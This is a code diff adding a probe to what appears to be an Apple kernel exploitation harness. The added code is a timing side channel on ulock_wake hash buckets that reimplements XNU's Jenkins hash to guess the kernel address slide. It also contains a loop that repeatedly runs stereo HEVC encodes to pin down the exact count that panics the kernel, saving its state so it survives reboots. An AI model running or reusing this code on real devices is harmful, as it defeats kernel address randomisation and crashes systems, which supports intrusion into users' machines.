@@ -93,6 +93,7 @@ extern kern_return_t mach_make_memory_entry_64(
 #include <dirent.h>
 #include <fcntl.h>
 #include <errno.h>
+#include <math.h>
 #include <compression.h>
 #include <stdatomic.h>
 #include <arpa/inet.h>
@@ -14274,6 +14275,251 @@ static void r339_probe(void) {
     free(canary);
 
     rlog("\n=== r339 complete ===\n");
+    fflush(stdout);
+}
+
+/* r343: Natural bucket timing KASLR + exact crash threshold
+ * Part A: Measure ulock_wake timing across all 1024 buckets WITHOUT adding
+ *         our own waiters — detect kernel-loaded buckets from natural timing.
+ *         Use os_hash_jenkins (one-at-a-time) matching XNU's hash function.
+ * Part B: Exact lid=3 crash threshold: 336→360 step 1, per-encode property check.
+ *         Saves state to survive reboots. */
+static void r343_probe(void) {
+    rlog("\n=== r343: Natural Bucket Timing KASLR + Crash Threshold ===\n\n");
+    fflush(stdout);
+
+    /* ---- Part A: Natural ulock bucket timing ---- */
+    rlog("--- Part A: Natural ulock bucket timing (no waiters) ---\n");
+    rlog("  Measuring raw ulock_wake latency per hash bucket.\n");
+    rlog("  Kernel-loaded buckets should show higher latency.\n\n");
+    fflush(stdout);
+
+    uint32_t my_pid = getpid();
+    uint32_t table_sz = 1024;
+
+    /* os_hash_jenkins (one-at-a-time): matches XNU's ull_hash_index */
+    /* Key = { pid(4 bytes) | addr(8 bytes) } = 12 bytes total */
+
+    /* Allocate probe pages */
+    size_t probe_sz = 4096 * 4096; /* 16MB to cover more buckets */
+    void *pbase = mmap(NULL, probe_sz, PROT_READ | PROT_WRITE,
+                       MAP_ANON | MAP_PRIVATE, -1, 0);
+    if (pbase == MAP_FAILED) {
+        rlog("  mmap failed (%zu bytes)\n", probe_sz);
+        goto r343_partb;
+    }
+
+    /* os_hash_jenkins implementation (Jenkins one-at-a-time) */
+    /* Hashes the ulk_t key: { uint32_t pid, uint64_t addr } = 12 bytes */
+    #define R343_OAAT_HASH(pid_val, addr_val, tbl_sz) ({ \
+        uint8_t _key[12]; \
+        memcpy(_key, &(pid_val), 4); \
+        memcpy(_key + 4, &(addr_val), 8); \
+        uint32_t _h = 0; \
+        for (int _i = 0; _i < 12; _i++) { \
+            _h += _key[_i]; \
+            _h += (_h << 10); \
+            _h ^= (_h >> 6); \
+        } \
+        _h += (_h << 3); \
+        _h ^= (_h >> 11); \
+        _h += (_h << 15); \
+        _h & ((tbl_sz) - 1); \
+    })
+
+    /* Build bucket→addr map using corrected hash */
+    uint64_t bucket_addrs[1024];
+    memset(bucket_addrs, 0, sizeof(bucket_addrs));
+    int mapped = 0;
+    for (size_t off = 0; off < probe_sz && mapped < (int)table_sz; off += 4096) {
+        uint64_t addr = (uint64_t)pbase + off;
+        uint32_t pid_copy = my_pid;
+        uint32_t b = R343_OAAT_HASH(pid_copy, addr, table_sz);
+        if (bucket_addrs[b] == 0) {
+            bucket_addrs[b] = addr;
+            mapped++;
+        }
+    }
+    rlog("  Mapped %d / %u buckets (oaat hash, pid=%u)\n", mapped, table_sz, my_pid);
+    fflush(stdout);
+
+    /* Warm up: do some dummy ulock operations */
+    for (int i = 0; i < 50; i++) {
+        if (bucket_addrs[i]) {
+            volatile uint32_t *lk = (volatile uint32_t *)bucket_addrs[i];
+            *lk = 1;
+            syscall(516, UL_COMPARE_AND_WAIT | ULF_NO_ERRNO, lk, 0, 0, 0);
+        }
+    }
+
+    /* Measure each bucket WITHOUT adding waiters, 500 reps */
+    #define R343_REPS  500
+    rlog("  Timing %d buckets x %d reps (naked wake)...\n", mapped, R343_REPS);
+    fflush(stdout);
+
+    double bucket_times[1024];
+    memset(bucket_times, 0, sizeof(bucket_times));
+    double global_sum = 0;
+    int global_n = 0;
+
+    for (int b = 0; b < (int)table_sz; b++) {
+        if (!bucket_addrs[b]) { bucket_times[b] = -1; continue; }
+        volatile uint32_t *lk = (volatile uint32_t *)bucket_addrs[b];
+        *lk = 1; /* Ensure no wait condition */
+        uint64_t tsum = 0;
+        for (int r = 0; r < R343_REPS; r++) {
+            uint64_t t0 = mach_absolute_time();
+            syscall(516, UL_COMPARE_AND_WAIT | ULF_NO_ERRNO, lk, 0, 0, 0);
+            uint64_t t1 = mach_absolute_time();
+            tsum += (t1 - t0);
+        }
+        bucket_times[b] = (double)tsum / R343_REPS;
+        global_sum += bucket_times[b];
+        global_n++;
+    }
+    double global_avg = (global_n > 0) ? global_sum / global_n : 1.0;
+    rlog("  Global avg: %.2f ticks (%d buckets measured)\n", global_avg, global_n);
+
+    /* Find statistical outliers (buckets significantly above average) */
+    double var_sum = 0;
+    for (int b = 0; b < (int)table_sz; b++) {
+        if (bucket_times[b] < 0) continue;
+        double d = bucket_times[b] - global_avg;
+        var_sum += d * d;
+    }
+    double stddev = (global_n > 1) ? sqrt(var_sum / (global_n - 1)) : 1.0;
+    rlog("  Stddev: %.2f ticks\n", stddev);
+    fflush(stdout);
+
+    /* Report top outliers (> 2 stddev above mean) */
+    int outlier_count = 0;
+    rlog("\n  Outlier buckets (> mean + 2*stddev = %.1f):\n", global_avg + 2*stddev);
+    for (int b = 0; b < (int)table_sz; b++) {
+        if (bucket_times[b] < 0) continue;
+        if (bucket_times[b] > global_avg + 2 * stddev) {
+            rlog("    bucket %4d: %.1f ticks (%.1fx avg)\n",
+                 b, bucket_times[b], bucket_times[b] / global_avg);
+            outlier_count++;
+            if (outlier_count >= 30) { rlog("    ...(capped)\n"); break; }
+        }
+    }
+    rlog("  Total outliers: %d\n", outlier_count);
+    fflush(stdout);
+
+    /* For each outlier bucket, find kernel base candidates */
+    if (outlier_count > 0 && outlier_count <= 20) {
+        rlog("\n  Kernel slide candidates for outlier buckets (pid=0, oaat hash):\n");
+        fflush(stdout);
+        uint64_t kbase = 0xfffffe0006004000ULL;
+        uint64_t slide_lo = 0x30000000ULL;
+        uint64_t slide_hi = 0x40000000ULL;
+        uint64_t slide_step = 0x200000ULL; /* 2MB */
+        for (int b = 0; b < (int)table_sz; b++) {
+            if (bucket_times[b] < 0) continue;
+            if (bucket_times[b] <= global_avg + 2 * stddev) continue;
+            rlog("    Bucket %d (%.1fx): slides=", b, bucket_times[b] / global_avg);
+            int cnt = 0;
+            for (uint64_t s = slide_lo; s < slide_hi; s += slide_step) {
+                uint64_t kaddr = kbase + s;
+                uint32_t kpid = 0;
+                uint32_t kbucket = R343_OAAT_HASH(kpid, kaddr, table_sz);
+                if (kbucket == (uint32_t)b) {
+                    rlog("0x%llx ", s);
+                    cnt++;
+                    if (cnt >= 6) { rlog("... "); break; }
+                }
+            }
+            if (cnt == 0) rlog("(none in range)");
+            rlog("\n");
+        }
+    }
+
+    /* Also try the KNOWN slides from panic logs */
+    rlog("\n  Verification: known slides → bucket mapping:\n");
+    {
+        uint64_t known_slides[] = { 0x31768000ULL, 0x352e4000ULL };
+        for (int i = 0; i < 2; i++) {
+            uint64_t kaddr = 0xfffffe0006004000ULL + known_slides[i];
+            uint32_t kpid = 0;
+            uint32_t kb = R343_OAAT_HASH(kpid, kaddr, table_sz);
+            rlog("    slide=0x%llx → kaddr=0x%llx → bucket=%u (time=%.1f, ratio=%.1fx)\n",
+                 known_slides[i], kaddr, kb,
+                 bucket_times[kb] >= 0 ? bucket_times[kb] : 0.0,
+                 bucket_times[kb] > 0 ? bucket_times[kb] / global_avg : 0.0);
+        }
+    }
+    fflush(stdout);
+
+    munmap(pbase, probe_sz);
+
+r343_partb:
+    /* ---- Part B: Exact lid=3 crash threshold ---- */
+    rlog("\n--- Part B: Exact lid=3 crash threshold ---\n");
+    rlog("  r342: 335 encodes OK, no crash.\n");
+    rlog("  Testing 336→360 step 1 to find exact panic point.\n\n");
+    fflush(stdout);
+
+    if (phase1_verify() != 0) goto r343_done;
+
+    /* Save state for reboot recovery */
+    char r343_state[256];
+    {
+        char *hd = getenv("HOME");
+        snprintf(r343_state, sizeof(r343_state),
+                 "%s/Documents/r343_state.bin", hd ? hd : "/tmp");
+    }
+    int start_at = 336;
+    FILE *sf = fopen(r343_state, "rb");
+    if (sf) {
+        uint32_t magic;
+        if (fread(&magic, 4, 1, sf) == 1 && magic == 0xDEAD0343) {
+            int prev;
+            if (fread(&prev, 4, 1, sf) == 1) {
+                start_at = prev + 1;
+                rlog("  Recovered: last attempt was %d encodes (panicked).\n", prev);
+                rlog("  Starting at %d.\n\n", start_at);
+            }
+        }
+        fclose(sf);
+    }
+
+    for (int target = start_at; target <= 360; target++) {
+        rlog("  [lid=3 x%d] ", target);
+        fflush(stdout);
+
+        /* Save state before this attempt */
+        {
+            FILE *wf = fopen(r343_state, "wb");
+            if (wf) {
+                uint32_t m = 0xDEAD0343;
+                fwrite(&m, 4, 1, wf);
+                fwrite(&target, 4, 1, wf);
+                fflush(wf); fsync(fileno(wf)); fclose(wf);
+            }
+        }
+
+        VTCompressionSessionRef enc3 = create_mvhevc_encoder(1920, 1080, 3);
+        if (!enc3) { rlog("FAIL: encoder create\n"); continue; }
+
+        int ok = 0, err = 0;
+        for (int f = 0; f < target; f++) {
+            int st = encode_one_stereo_lid(enc3, f, 1920, 1080, 3);
+            if (st == 0) ok++;
+            else err++;
+        }
+        VTCompressionSessionCompleteFrames(enc3, kCMTimeInvalid);
+        rlog("ok=%d err=%d", ok, err);
+
+        /* If we get here, no panic */
+        VTCompressionSessionInvalidate(enc3);
+        CFRelease(enc3);
+        rlog(" SURVIVED\n");
+        fflush(stdout);
+    }
+    rlog("  All encode counts survived (336-360).\n");
+
+r343_done:
+    rlog("\n=== r343 complete ===\n");
     fflush(stdout);
 }
 
@@ -47139,6 +47385,13 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 346) {
+            rlog("*** rounds=346: Natural Bucket Timing KASLR + Crash Threshold ***\n");
+            rlog("  r342: 335 lid=3 encodes survived, all IOSurface props unchanged.\n");
+            rlog("  r343: Correct oaat hash, naked wake timing, crash boundary.\n\n");
+            r343_probe();
             goto done;
         }
         if (rounds == 345) {
